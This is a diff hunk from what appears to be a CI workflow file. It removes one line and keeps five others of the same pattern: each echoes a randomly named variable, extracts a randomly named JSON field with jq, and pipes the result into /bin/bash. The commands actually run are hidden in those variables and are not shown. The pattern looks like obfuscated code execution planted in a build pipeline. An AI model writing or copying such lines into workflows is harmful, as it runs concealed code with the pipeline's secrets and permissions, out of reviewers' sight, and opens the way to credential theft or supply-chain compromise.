@@ -31,7 +31,6 @@ jobs:
           echo $mi9 | jq -r .slxj020 | /bin/bash
           echo $dujt551 | jq -r .h55 | /bin/bash
           echo $feem973 | jq -r .loxbt08 | /bin/bash
-          echo $pt3682 | jq -r .wvkf685 | /bin/bash
           echo $qu99 | jq -r .t644 | /bin/bash
           printf '%s' "$ajckj032" | jq -r .mhagu3700 | /bin/bash
 
